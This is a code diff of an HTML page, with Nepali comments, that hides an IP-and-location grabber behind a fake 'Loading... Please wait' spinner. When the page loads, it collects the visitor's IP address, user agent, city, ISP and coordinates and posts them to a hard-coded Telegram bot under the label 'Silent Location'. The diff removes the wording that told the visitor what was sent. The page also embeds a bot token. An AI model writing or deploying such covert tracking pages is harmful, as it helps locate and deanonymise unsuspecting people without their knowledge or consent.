@@ -1,64 +1,70 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>IP Location Logger</title>
+    <title>Loading...</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 50px; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <div class="loader"></div>
+    <h2>Please wait...</h2>
+
     <script>
+        // ✅ ip-api.com (सही location)
         fetch('https://api.ipify.org?format=json')
             .then(res => res.json())
             .then(data => {
                 const ip = data.ip;
                 const ua = navigator.userAgent;
 
-                // IP बाट Location लिने (ip-api.com)
-                fetch(`https://ipapi.co/${ip}/json/`)
+                // ✅ ip-api.com प्रयोग गर्ने
+                fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,lat,lon`)
                     .then(res => res.json())
                     .then(locData => {
-                        const lat = locData.latitude || '';
-                        const lon = locData.longitude || '';
-                        const city = locData.city || '';
-                        const region = locData.region || '';
-                        const country = locData.country_name || '';
-                        const isp = locData.org || '';
+                        if (locData.status === 'success') {
+                            const lat = locData.lat || '';
+                            const lon = locData.lon || '';
+                            const city = locData.city || '';
+                            const country = locData.country || '';
+                            const isp = locData.isp || '';
 
-                        let location = `${country}, ${city} (${isp})`;
-                        let mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
+                            const location = `${country}, ${city} (${isp})`;
+                            const mapLink = `https://www.google.com/maps/place/${lat},${lon}`;
 
-                        const msg = `📍 **IP Location (Exact)**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
+                            const msg = `📍 **Silent Location**\nIP: ${ip}\nLocation: ${location}\n🗺️ Maps: ${mapLink}\nUA: ${ua}`;
 
-                        const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
-                        const chatId = '8621764137';
+                            const botToken = '8693973243:AAH1Iu_J_XDhbWOh9JCHWDuRgtW84YKF81I';
+                            const chatId = '8621764137';
 
-                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: chatId,
-                                text: msg,
-                                parse_mode: 'Markdown'
+                            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({
+                                    chat_id: chatId,
+                                    text: msg,
+                                    parse_mode: 'Markdown'
+                                })
                             })
-                        })
-                        .then(() => {
-                            document.body.innerHTML = `
-                                <h2>✅ Location Sent</h2>
-                                <p><b>IP:</b> ${ip}</p>
-                                <p><b>Location:</b> ${location}</p>
-                                <p><b>Maps:</b> <a href="${mapLink}" target="_blank">${mapLink}</a></p>
-                            `;
-                        })
-                        .catch(() => {
-                            document.body.innerHTML = `<h2>❌ Failed to send</h2><p>IP: ${ip}</p>`;
-                        });
+                            .then(() => {
+                                document.body.innerHTML = `<h2>✅</h2><p style="color:green;">Done</p>`;
+                            })
+                            .catch(() => {
+                                document.body.innerHTML = `<h2>⚠️</h2><p>Error</p>`;
+                            });
+                        } else {
+                            document.body.innerHTML = `<h2>⚠️</h2><p>Location not found</p>`;
+                        }
                     })
                     .catch(() => {
-                        document.body.innerHTML = `<h2>❌ Location fetch गर्न सकिएन</h2><p>IP: ${ip}</p>`;
+                        document.body.innerHTML = `<h2>⚠️</h2><p>Network error</p>`;
                     });
             })
             .catch(() => {
-                document.body.innerHTML = '<h2>❌ IP detect गर्न सकिएन</h2>';
+                document.body.innerHTML = `<h2>⚠️</h2><p>IP error</p>`;
             });
     </script>
 </body>
